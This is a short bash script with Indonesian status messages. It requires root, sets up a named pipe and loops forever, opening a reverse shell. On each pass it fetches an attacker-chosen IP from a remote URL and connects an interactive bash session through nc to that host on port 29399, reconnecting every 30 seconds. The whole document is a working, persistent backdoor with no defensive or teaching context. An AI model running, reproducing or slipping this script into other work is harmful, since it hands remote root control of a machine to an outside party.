#!/bin/bash
if [[ "$(id -u)" != "0" ]];then
 echo "    GAGAL !!!,kamu harus dalam mode root"
 exit 0
fi

rm -rf /tmp/f

mkfifo /tmp/f

while true; do

 if [ "$(pgrep -f ./nc)" = "" ]; then
  IP=$(curl -s https://ibnusaja.nasihosting.com/temp.txt)
  PORT="29399"
  cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f
 fi
 echo "sudah jalan"
 sleep 30
done
